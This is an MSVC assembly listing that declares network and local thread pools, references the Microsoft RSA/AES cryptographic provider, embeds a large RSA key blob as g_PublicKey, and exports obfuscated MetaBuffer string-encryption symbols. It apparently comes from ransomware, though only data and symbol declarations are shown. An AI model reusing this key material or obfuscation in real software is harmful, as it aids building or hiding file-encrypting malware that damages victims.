; Listing generated by Microsoft (R) Optimizing Compiler Version 19.39.33522.0 

include listing.inc

INCLUDELIB OLDNAMES

PUBLIC	??_C@_0DG@DGPPHCJL@Microsoft?5Enhanced?5RSA?5and?5AES?5@ ; `string'
PUBLIC	??_C@_0EC@PDAENLNI@Microsoft?5Enhanced?5RSA?5and?5AES?5@ ; `string'
PUBLIC	?g_NetworkThreadPool@@3Uthreadpool_info@@A	; g_NetworkThreadPool
PUBLIC	?g_LocalThreadPool@@3Uthreadpool_info@@A	; g_LocalThreadPool
PUBLIC	?g_PublicKey@@3PAEA				; g_PublicKey
?g_NetworkThreadPool@@3Uthreadpool_info@@A DB 050H DUP (?) ; g_NetworkThreadPool
?g_LocalThreadPool@@3Uthreadpool_info@@A DB 050H DUP (?) ; g_LocalThreadPool
_BSS	ENDS
;	COMDAT ??_C@_0EC@PDAENLNI@Microsoft?5Enhanced?5RSA?5and?5AES?5@
CONST	SEGMENT
??_C@_0EC@PDAENLNI@Microsoft?5Enhanced?5RSA?5and?5AES?5@ DB 'Microsoft En'
	DB	'hanced RSA and AES Cryptographic Provider (Prototype)', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0DG@DGPPHCJL@Microsoft?5Enhanced?5RSA?5and?5AES?5@
CONST	SEGMENT
??_C@_0DG@DGPPHCJL@Microsoft?5Enhanced?5RSA?5and?5AES?5@ DB 'Microsoft En'
	DB	'hanced RSA and AES Cryptographic Provider', 00H ; `string'
	ORG $+8
?g_PublicKey@@3PAEA DB 07H, 02H, 00H, 00H, 00H, 0a4H, 00H, 00H, 'RSA2', 00H
	DB	010H, 00H, 00H, 01H, 00H, 01H, 00H, 0b5H, 0b4H, 0dcH, 'U', 0feH
	DB	'k', 0c0H, 05H, 'e', 0d1H, 0d0H, 07H, '_', 0dfH, 0faH, 018H, '@'
	DB	0e0H, 0d5H, 0c2H, 0d2H, 0f8H, 0fbH, 0daH, '7', 0f7H, 01dH, 0d6H
	DB	090H, 08cH, 0e6H, 0c0H, 'g3', 091H, 0aaH, '>', 09aH, 099H, 0faH
	DB	'!Ad', 0e0H, 'Ax', 010H, 0b7H, '6', 017H, 'Yo', 0a1H, 0d3H, '~'
	DB	'[', 0bH, 0c6H, 0bfH, 0f5H, 089H, 0fbH, 'o', 0f4H, 0e8H, 0c2H, 0ecH
	DB	096H, 0d6H, 098H, 0cdH, 0fdH, 'X', 0fbH, 0a5H, 0dfH, 0d8H, 015H
	DB	'@o4}', 0f1H, 0fbH, 0e1H, 0ebH, 'N', 0d2H, 'Ncp^h', 08eH, 'B', 01eH
	DB	0adH, '~', 085H, '@', 0feH, 084H, 0adH, 0b6H, 0e0H, 0a4H, '``', 0bbH
	DB	01H, 0c8H, 0f3H, '65', 084H, 0e1H, 0d0H, 'X', 01bH, 0beH, 'X', 0ccH
	DB	'''u|', 0c5H, 0b1H, 0e4H, 0deH, ':K', 08cH, 0d8H, '5$', 08aH, 088H
	DB	084H, 'tY!', 0a2H, ';', 0d7H, 082H, 0b2H, 017H, 00H, 089H, 083H
	DB	0e0H, 'pT', 0e3H, 0dfH, '\Ug', 019H, 'I', 0e6H, 'D', 0a0H, ' "'
	DB	':S', 09aH, 0bfH, 0cdH, 'Ls9ZS', 0a2H, 0deH, 0a5H, 0fcH, 01cH, '_'
	DB	'\', 083H, 0bfH, 098H, 'n', 0bcH, '!//Pwy', 0f3H, 'K', 0dH, 0b0H
	DB	0e1H, 0fcH, 0e7H, 08eH, 0d5H, 0daH, 'F', 089H, 0aeH, 'SO\', 0b0H
	DB	'c', 0faH, '?bO', 088H, 0e0H, '''Ma', 0b0H, 01eH, 0deH, 't`', 081H
	DB	0ddH, 0b5H, 'Rt', 0eH, '(', 091H, 018H, 0baH, '\', 094H, 099H, 'E'
	DB	08aH, 0bbH, 0cdH, 089H, 0e0H, 0dH, 0ccH, '/', 091H, 0dH, 0a4H, 0bfH
	DB	'P', 0dcH, 0bcH, 'E', 0bH, 'B', 0aeH, '2', 0abH, 01fH, 015H, 0c1H
	DB	')', 0a3H, '|U$', 095H, 0b9H, '}', 017H, 03H, '2', 081H, 0c6H, 'c'
	DB	08H, '2', 0eeH, '7)', 0beH, 091H, 0c2H, '&T', 0c8H, '4GA,Q', 0fbH
	DB	'p', 08aH, 0cH, '5:', 0e3H, '5d*M', 0b9H, 0f2H, 0d8H, 02H, 08aH
	DB	0feH, 0bfH, 0d0H, 'T', 07fH, 0deH, '5', 0bfH, 0ccH, 0d1H, '%', 0ecH
	DB	'B', 093H, 0beH, 0cH, 0aeH, 017H, 0eH, 0b8H, 06H, 'd;0z7', 014H
	DB	018H, 083H, 'j[', 0d7H, 0b7H, '!G', 018H, 0ecH, 0f1H, 093H, 'u'
	DB	0bcH, 0d2H, '1', 092H, 'H', 0b2H, 08eH, 01fH, 0b5H, 'x', 010H, 0bH
	DB	010H, '}"', 089H, 0f0H, 'Z', 083H, 0c4H, 04H, 0afH, 0a5H, 'D', 090H
	DB	0c1H, 0b6H, 082H, 0bbH, 03H, 09H, 'E', 087H, 0ecH, 'I', 0e4H, 'F'
	DB	'Xp', 096H, 07H, 'm', 093H, 0adH, 0b6H, 'GK', 0deH, 011H, '#Dg'
	DB	'g>', 0e0H, 'Y[', 0cdH, 'lVx', 0d4H, ';', 017H, 0baH, 09cH, 0a1H
	DB	'@', 086H, 016H, 0fbH, 0a7H, '\', 0dcH, 'L', 080H, 09H, 0bfH, 0ddH
	DB	0b4H, 0a8H, 0bH, 0e5H, 0d4H, 'D', 0eH, '^', 0bdH, 0c4H, 0d0H, '@'
	DB	'R', 0dH, 'B', 013H, 010H, '.', 0f7H, 0a6H, 0a1H, 0e0H, '@', 0b1H
	DB	0b9H, 'qr', 0dfH, 0f1H, 092H, 085H, 0caH, '*f', 0c6H, 0a3H, 013H
	DB	089H, '.', 0bbH, 01dH, '2', 0e9H, 01eH, 0ddH, '+F', 0e3H, 0deH
	DB	0f9H, 09aH, 0e3H, 'O', 0e2H, 09bH, 02H, 0e8H, '1', 090H, 0b7H, 'X'
	DB	097H, 09fH, 'C', 0fH, 'Q6', 0d9H, 0aeH, 'X', 0acH, 018H, 0fcH, 0eH
	DB	013H, 0b0H, 'y', 0baH, 0d3H, 0bdH, 09fH, 'XU', 0b1H, 0fH, 0f2H
	DB	0cH, '$IU', 0b1H, 0b7H, 0bfH, 03H, 0e3H, 0d1H, 0a4H, 0efH, 0b5H
	DB	'?|uXH', 0aaH, 097H, 012H, '5', 0a0H, 0eeH, 'c")', 0dH, 0d8H, 01aH
	DB	'WX', 07fH, 'X', 0c0H, 'NP', 0f2H, 0a8H, 01dH, 0fH, 'e', 0b5H, 0e7H
	DB	014H, '8sEGM', 0bH, 'MI', 0fH, 0d4H, 06H, 096H, 0b7H, 0e0H, 'N'
	DB	084H, 0c6H, 'd&4', 0cdH, 0a8H, 'd', 0fdH, 0e2H, 'Q', 0e2H, 'Fp'
	DB	'F', 04H, 'e', 03H, 'r', 0ecH, 0c7H, 'K`', 0b8H, 'A:j`', 012H, 0e3H
	DB	'gw', 017H, 0cH, 'cv', 099H, 0ebH, 04H, 01eH, 0ddH, 08dH, 'b', 0bcH
	DB	0aaH, 096H, 0e6H, 'j', 01fH, 0eeH, 0feH, 091H, 089H, 0a7H, 095H
	DB	'5j', 019H, 0ccH, '"', 0dH, '7`', 0fcH, 092H, '3', 0f4H, 06H, '8'
	DB	01eH, 0eaH, 09cH, 09cH, '*]9', 0d4H, 0f9H, 0e7H, 0baH, 'y', 0ddH
	DB	'n', 0eH, 0ebH, 'v4(N', 085H, 0dfH, 0e2H, 0a4H, 0c6H, 'GB', 098H
	DB	'(', 0d0H, '7', 0dbH, '85', 0ddH, '6;D+Y!', 018H, '11', 0a1H, 0d3H
	DB	0b6H, 09dH, '%', 0bH, 0dcH, 0fH, '_', 088H, '!g', 0b5H, 'T', 0f4H
	DB	'=', 0deH, 016H, 084H, 0abH, 0e8H, 094H, 085H, 083H, 099H, 0d0H
	DB	0a3H, 0a9H, 01dH, 0eH, '4@', 03H, 0e0H, 011H, 'Y;i', 090H, 01H
	DB	0a4H, ';o', 090H, 0d7H, 'P', 0c0H, 0d9H, 'P~Uy+N', 0b8H, '6', 09dH
	DB	'A}', 0c8H, 0c2H, 'Y', 0d1H, 0cbH, 084H, 0e2H, 0d6H, 0b9H, 0cdH
	DB	07H, 'w', 0a5H, '-ah', 081H, '"', 012H, '1', 014H, 0c9H, 0fbH, 0a0H
	DB	0feH, 095H, 0abH, 'W', 02H, 01aH, 04H, 0bH, 0c4H, 0b4H, 0dbH, '6'
	DB	08bH, 'X', 00H, '5', 0f2H, 'L', 0adH, 0ebH, 'u{I', 0e7H, 085H, ''''
	DB	'Q', 014H, 014H, 090H, 0f6H, 0b8H, 08bH, 0dcH, 'i', 0a1H, '6b', 0cbH
	DB	'c:', 094H, 09dH, 0dfH, '%3', 08eH, 0fbH, 087H, 'G', 0abH, 'u', 0f8H
	DB	0ebH, ',', 0b5H, 091H, 09cH, 0a0H, 0d2H, 0e2H, 06H, 0b5H, 0adH
	DB	'2s', 09cH, 'P(DS5', 0faH, 'z2', 083H, 'g9 G}', 0a8H, 096H, 'M'
	DB	03H, 0c1H, '~', 0d1H, 0f5H, 0a8H, '^', 011H, 0f0H, 'D', 019H, 01dH
	DB	03H, 0c7H, 0bbH, 0fdH, 013H, 'u', 0d8H, 0c3H, 0feH, 0f4H, 0feH
	DB	0bdH, 0bbH, '$', 0c6H, 'u', 0aaH, '{K', 08bH, 0b9H, 0a6H, 'bC', 0e5H
	DB	'c', 0eH, 0c8H, 0ecH, 0c6H, '%\J', 0afH, 0a0H, '7', 086H, 087H
	DB	0b7H, 07H, 'a', 017H, 08fH, 0c0H, '7', 0a0H, 0e0H, 'o', 09H, 'x'
	DB	010H, 'cj', 0acH, 01eH, 0b3H, '|', 01aH, 0d7H, 0b3H, '|k', 01aH
	DB	'u4', 094H, '_', 0abH, 0d7H, '9', 0f5H, 03H, 0fbH, '-80\', 0f0H
	DB	'5', 015H, '.', 0e8H, 0c4H, 08dH, 0eaH, '+|l', 0b4H, 094H, '[', 07fH
	DB	081H, 01aH, 0ffH, 096H, 0d5H, 0bdH, 0bcH, 09eH, 089H, '\', 0d8H
	DB	'E', 0e9H, 'H', 0ceH, '+p_', 0a2H, 093H, '7', 0fcH, '''z', 0a1H
	DB	0eeH, '''', 08H, 0a8H, ';_', 01aH, 0c3H, 0e1H, 01eH, 0c9H, '=P'
	DB	'R', 084H, 0ebH, '1', 0c2H, '''', 0ccH, 015H, 0f7H, 'bT', 0a4H
	DB	010H, 0d1H, 0b0H, 'K3', 0caH, 0a1H, 'O', 09cH, 'dq', 0c8H, 'b', 0d3H
	DB	0c4H, 0e1H, 0abH, 0cbH, 'PL', 0b9H, 097H, 'Q', 0caH, 0e8H, ':M'
	DB	013H, 'n', 09dH, 0fbH, 0ccH, 011H, 0a6H, 0bcH, 'H', 0ceH, 't7N'
	DB	'O', 0adH, 0e1H, 0e1H, 08aH, '@', 0d2H, 0f7H, 00H, '$<', 08H, '"'
	DB	016H, 0a4H, '?]', 090H, 0b8H, ')''', 0d1H, '1u', 0cdH, 0aeH, 0aaH
	DB	0b7H, 0f2H, 0e0H, 0b7H, 0cfH, '/1,', 0caH, 09cH, 083H, 0ddH, ''''
	DB	09fH, 014H, 0acH, 088H, 09bH, 0c0H, 0cfH, 0b5H, 0f9H, 09dH, 'n'
	DB	0a7H, 0c5H, 04H, 0dbH, '<', 084H, 0b5H, '7I', 086H, 0d0H, '<w', 07H
	DB	06H, 0b7H, 01dH, 0e4H, 0a4H, 'V', 07H, 09bH, 0daH, 0e2H, 'M.9', 016H
	DB	0e1H, 08cH, 0f4H, 0afH, 0dcH, 012H, '(', 0e8H, 09aH, 'y', 0ceH
	DB	't', 0aeH, 0b5H, 0ffH, 010H, 0e5H, 'O}', 016H, 0b8H, '*', 01eH
	DB	099H, 0bH, 0cbH, 0f8H, 0eH, 0bdH, 0c2H, 00H, 'M', 0ffH, 0dfH, 086H
	DB	'w2', 0a4H, 0cbH, 0aaH, 0fdH, 096H, 080H, 0b2H, 0feH, 0c1H, 0abH
	DB	0b1H, 087H, 'C', 09dH, '(e', 0d5H, 080H, 'w', 0b8H, 'L1', 0b7H
	DB	'>', 0a2H, '[', 0c4H, 012H, 'E(Y', 019H, 0d9H, 0c0H, 0a7H, '"', 0ffH
	DB	09bH, 0afH, 0e7H, 'K', 00H, 07H, 0b6H, 096H, 0cfH, 'k', 09cH, 017H
	DB	089H, 'j', 0daH, 'a', 0c7H, 0eH, 015H, 082H, 0faH, 093H, 'S', 08dH
	DB	'.', 011H, '&', 0c2H, 01H, 0e2H, 0beH, '+', 011H, 'z', 0ebH, 'W'
	DB	'c', 0cfH, 0b3H, ')', 0e8H, 0a0H, 'E\`', 01dH, '?D_F', 088H, 09eH
	DB	06H, '6', 0f2H, 'A', 0caH, 0aaH, 0c5H, '&', 0fdH, 'b', 0d5H, 0f9H
	DB	'h', 0fcH, 015H, 08cH, 0e3H, 090H, 082H, 0ecH, 'O', 0d2H, 'D', 0abH
	DB	01aH, ':', 096H, 'o', 01cH, 0ceH, 091H, 096H, 0edH, 0d6H, 0dcH
	DB	'''>', 0c7H, 'c!:', 0d7H, 'gn', 01cH, '7', 0bcH, 0f3H, '7`', 01cH
	DB	'3', 0c7H, 'wK', 0deH, 019H, 0ebH, 09H, 01dH, 0e8H, 09fH, '|1', 0b6H
	DB	0e2H, 0eeH, 015H, 017H, 01aH, '9', 0e2H, 0f8H, 'm', 0d1H, 'C;u'
	DB	017H, 0e8H, ' ', 088H, 'vPQf', 0d8H, 'a', 0b9H, 'mSW', 0a7H, 0ddH
	DB	'Ft', 084H, 0f2H, '?', 0f7H, '+', 0e9H, 014H, 0f1H, 0f3H, 0bdH
	DB	09H, 0ccH, 09bH, '[', 018H, 0d3H, 0f9H, 01eH, 'm', 01aH, '!', 0b4H
	DB	'P', 05H, '{', 01aH, '_', 0f5H, 'Z', 093H, 089H, 0a3H, '8', 0a4H
	DB	'P,V', 0beH, 0c3H, 0dcH, 085H, 08eH, 0edH, 0b9H, 099H, 'W', 0d8H
	DB	0d7H, 0ceH, 0b5H, 0bdH, 01eH, 0d2H, 0adH, 018H, 09H, 'N', 0f1H
	DB	'/', 0faH, 0caH, '-', 0cfH, '{', 0b9H, 00H, 09bH, 'p', 0fbH, 0b1H
	DB	'a', 012H, 01aH, 0e1H, '=0', 0ddH, 0c2H, 083H, 0f4H, 0d3H, '|', 0f8H
	DB	0f0H, 'I', 0e9H, 01H, 02H, 0e3H, '%', 01cH, 0e7H, '!', 00H, 0afH
	DB	0bfH, 0cdH, '(f', 0cfH, 01cH, 0cH, 0d4H, 0f6H, 'ai<#w', 0d4H, 0a6H
	DB	'3', 0a3H, 0b7H, 0d9H, '8', 0afH, 08dH, 0ffH, '[J', 083H, 06H, 0e2H
	DB	09dH, 0ecH, 'A0', 08bH, 0fcH, 'v', 07fH, '+b', 0deH, '8', 0b8H
	DB	087H, 0dcH, 0aH, 'v', 0ffH, 0e2H, 0e0H, 0dfH, '-c', 0faH, 083H
	DB	'l(', 0dH, 0bcH, 095H, 0c7H, 'LS', 0d3H, 09eH, 'i', 093H, 'J', 0e3H
	DB	'~', 090H, 0a1H, '^', 0b0H, 'I', 0f4H, '''h', 0cH, 0a9H, 082H, 0cH
	DB	0f3H, 0b3H, 'T', 0a5H, 0a3H, 0c7H, 'o>', 0deH, 08H, '_', 0a5H, 'W'
	DB	0baH, 'Q', 0fbH, 0d6H, 'K', 010H, 0f4H, 'b', 094H, 08H, 0dH, '4'
	DB	0acH, 'jXK', 0c0H, 015H, 0e7H, 0ddH, ')', 0d2H, 0fdH, 095H, 09cH
	DB	'ZO', 0e2H, 'l)', 0ebH, 0d4H, 'z', 0a0H, 0daH, 'i', 0e7H, 'ES', 0dbH
	DB	06H, 'R_', 081H, '1', 0cdH, 01aH, 08cH, '5', 092H, 'b', 08bH, 09H
	DB	0bcH, 0cfH, 'W', 0c2H, 0aH, 'a', 04H, 's[', 0afH, 0bbH, 0a5H, 0a5H
	DB	080H, 0e8H, ':', 0c1H, 080H, 0b5H, 'Q', 01eH, '#A', 0c3H, 0c1H
	DB	0aH, 080H, 'R', 0c5H, 0b1H, 091H, 084H, 0dcH, 0edH, '(', 0b2H, 0c1H
	DB	'96', 081H, 015H, 0b8H, 094H, '1I', 019H, 0deH, 0aH, 0d0H, 0fH
	DB	0a2H, '\', 0faH, 0aaH, 0d2H, 02H, 082H, 0b7H, '>7V', 09dH, '?K'
	DB	096H, 0d6H, 0fH, 087H, 'i', 087H, 010H, 00H, 0fbH, 018H, 09dH, 0d2H
	DB	0e8H, 0faH, 0c4H, 'QMdi}', 07H, 0ecH, 0e3H, 096H, 'c', 0d2H, '/'
	DB	09H, 0a2H, 015H, 'u', 0cbH, 'h7_', 0b4H, 0e4H, 'IU', 0cfH, '[', 085H
	DB	08bH, 08eH, 015H, 'e(', 0b7H, '[se', 018H, 'Zq', 0eeH, 0b3H, 0efH
	DB	0f0H, 09aH, '1', 0e9H, 'S', 0eH, 0dcH, 0faH, 096H, 'S=', 0caH, 0b0H
	DB	'}GU', 0c9H, 'U', 0a7H, '@', 018H, 09dH, 0feH, '|', 08dH, 0c8H
	DB	't', 0e3H, '}', 096H, 082H, 0a5H, 088H, 0f4H, 015H, 0b6H, 087H
	DB	014H, '0`', 089H, 02H, '}', 0eeH, 'Q', 0e3H, 'OO', 0feH, 00H, 'M'
	DB	09H, 092H, 'a;', 09fH, 0bbH, 0deH, 0c9H, 05H, '*', 0cH, '?%S', 0c1H
	DB	0d7H, '#j', 0aeH, 'D:+', 0faH, 0c7H, 0afH, 0caH, 0c4H, 0d6H, '&'
	DB	0f9H, 0dfH, 09aH, 'E', 0c0H, 0bcH, 0f9H, 0fbH, ',', 0e4H, 09bH
	DB	099H, 0a6H, 0b2H, 0adH, 0ffH, 'p', 0cH, 'K', 01eH, 0b2H, '_K', 091H
	DB	'R', 0daH, '4W', 09eH, 0b2H, ';O', 0d9H, '$A,}', 096H, 0aH, '&'
	DB	0dcH, 0cH, 0f0H, 0b2H, 's', 00H, 'G', 0dcH, '8S', 082H, 'n%', 07fH
	DB	'vKA', 0efH, 'o', 081H, 0aH, 0c3H, 098H, 'V^!', 0c8H, 'I8n!$', 0e5H
	DB	011H, 09cH, 0fH, 0e9H, 'b', 096H, 'm', 0bH, 'g', 0cbH, 'B', 0faH
	DB	'H', 08aH, 'W', 08dH, 's', 0c8H, 088H, 04H, 0a8H, 09bH, 0ceH, 01dH
	DB	096H, 0f5H, 0b4H, 083H, 0adH, 0a3H, 0ffH, 0f5H, 'a', 014H, 0bdH
	DB	0f0H, 'g', 09bH, 0e3H, '\', 07fH, 012H, 0ffH, 'aP', 0faH, '~', 0c5H
	DB	'E!', 0e2H, 0ffH, '8|q', 0d0H, 0afH, 0e9H, 0f9H, 0a1H, 0aeH, 'u'
	DB	01dH, 0e8H, 0faH, '"', 0beH, 0e2H, 'q', 0f7H, 07H, 01eH, 0bdH, 014H
	DB	'K', 00H, 'L>', 0a0H, 015H, 0ccH, 0a3H, '^.l@', 09aH, '!),x', 014H
	DB	0ecH, 0eeH, 080H, '$\', 0ccH, '2', 0a6H, '9K', 0baH, 0a9H, 'j', 0e9H
	DB	')', 0b3H, 'H7', 0cfH, 0aH, 'D', 01cH, 'jC', 0b8H, ')}', 0dcH, 'm'
	DB	'4', 08bH, 0a0H, 'U=', 0ddH, 09bH, '_..', 081H, 0afH, '/', 084H
	DB	0a4H, 01H, 0acH, 0eaH, 09dH, 'i', 0f9H, 0b4H, ')', 03H, 'P', 0cH
	DB	'T', 08cH, 02H, 090H, '1', 0c7H, 'p', 0c6H, 09cH, 'v', 08dH, 0a0H
	DB	09H, ';', 094H, 01H, 0acH, '/', 0bH, 'V', 0c9H, 01fH, 086H, 01dH
	DB	099H, 0f4H, 'q', 0f6H, 094H, 083H, 09cH, '9', 0e4H, 0dfH, 's', 09aH
	DB	01dH, 'lC', 0a4H, '(', 018H, 0faH, 0b9H, 0b6H, 02H, 'pf4', 0acH
	DB	0f9H, 09bH, 016H, '%', 08bH, 0b2H, 'KE', 0c2H, 'Q', 0d6H, 0fH, 'c'
	DB	080H, 0dbH, 0d0H, 'Q', 0ebH, 'A', 0ccH, 013H, 0d6H, 017H, 'Y', 0d7H
	DB	0ccH, 01eH, 'E', 091H, '+>', 0eH, '3', 0cH, 09H, 0b7H, 01bH, 'c'
	DB	'n', 0a2H, '(', 018H, 0eaH, 'C4', 099H, '`', 0bcH, 0c5H, 097H, 'A'
	DB	0f8H, '|P', 0f3H, 08bH, 'o', 0e0H, 07H, 0a4H, 0cfH, 0c9H, 0fH, 'f'
	DB	'D', 0b1H, 0c3H, 0bcH, 'j', 0fbH, 0fdH, 'bBt}#p', 09fH, '{7', 0ffH
	DB	'i', 09eH, 0f8H, 'j', 0c3H, '?''', 0c5H, 0aaH, 0bbH, 0d9H, 0d4H
	DB	'B', 0f1H, 08aH, 0caH, 089H, 'q', 0c9H, 0ecH, 0dfH, 0b1H, 083H
	DB	'''', 0cdH, 0a5H, 0beH, 097H, 0deH, 0e7H, 'x', 0d4H, 0a9H, 0e0H
	DB	0e8H, '8u?', 098H, 'la', 0dcH, '{', 0c6H, 0eeH, 0eaH, 0a5H, 0e4H
	DB	09aH, 0a3H, 0cfH, 'R', 0d0H, 0c8H, 08aH, 0d1H, 0daH, 0f1H, '+', 0dH
	DB	'N.', 0cfH, 016H, 08dH, 016H, 092H, 07H, 014H, 0f9H, 'h', 097H
	DB	015H, 'J!', 0a7H, '2D', 089H, 012H, 0dcH, 0a4H, '+', 0e8H, 083H
	DB	0c1H, 0dbH, 0edH, 0b1H, 086H, 0bdH, '9vey', 02H, 09eH, 0baH, 0d5H
	DB	0b4H, 0eeH, 0e0H, 098H, 'K', 0f8H, 0c0H, 'H+1', 02H, 013H, 0ffH
	DB	'2', 015H, 'S;', 0c8H, '1', 091H, 010H, 00H, 083H, '=,', 0a7H, '4'
	DB	0dcH, 0d7H, 0dcH, 097H, 09bH, 'At', 0eeH, 'm', 0c8H, 09bH, 081H
	DB	09eH, 08cH, 0baH, 0b9H, 'a', 081H, 0deH, 0baH, 0fdH, '{', 0cfH
	DB	0faH, 0e7H, 'h', 0d7H, 0f0H, 09aH, 0c7H, '\?', 016H, 'xn', 00H ; g_PublicKey
	ORG $+1771
?_Fake_alloc@std@@3U_Fake_allocator@1@B	ORG $+1		; std::_Fake_alloc
PUBLIC	?isDecrypted@?$MetaBuffer@$02$0DC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEBA_NXZ ; MetaBuffer<3,50,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$02$0DC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<3,50,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$02$0DC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<3,50,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::decrypt
PUBLIC	?isDecrypted@?$MetaBuffer@$0GN@$0EJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEBA_NXZ ; MetaBuffer<109,73,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$0GN@$0EJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<109,73,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0GN@$0EJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<109,73,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::decrypt
PUBLIC	?isDecrypted@?$MetaBuffer@$0DN@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEBA_NXZ ; MetaBuffer<61,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::isDecrypted
